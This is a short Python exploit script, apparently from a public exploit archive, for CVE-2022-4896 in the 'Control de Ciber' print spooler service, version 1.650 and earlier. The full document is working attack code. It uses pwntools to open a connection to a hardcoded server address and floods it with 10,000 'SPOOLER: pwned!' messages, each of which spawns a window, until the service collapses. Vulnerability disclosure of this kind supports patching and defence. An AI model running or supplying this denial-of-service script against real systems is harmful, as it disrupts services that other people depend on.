# Exploit Title: Control de Ciber spooler - Denial of Service (DoS)
# Date: 23/02/2023
# Exploit Authors: sapellaniz
# Vendor Homepage: http://www.cbm.com.ar
# Software Link: http://www.cbm.com.ar/downloads.htm
# Version: <= 1.650
# Tested on: Linux
# CVE: CVE-2022-4896
# Github repo: https://github.com/sapellaniz/CVE-2022-4896

from pwn import *
from time import sleep

SERVER_IP = "192.168.56.101"
SERVER_PORT = 10000

def dos_spooler(ip, port):
    """
    When the server receives the string "SPOOLER: <msg>" a window spawns showing
    the message "Imprimiendo" and <msg> as window title.
    This function spawn windows on the server until the service collapses.
    """
    s = remote(ip, port)
    for i in range(10000):
        s.send(b'SPOOLER: pwned!\r\n')
        sleep(.05)


if __name__ == "__main__":
    dos_spooler(SERVER_IP, SERVER_PORT)
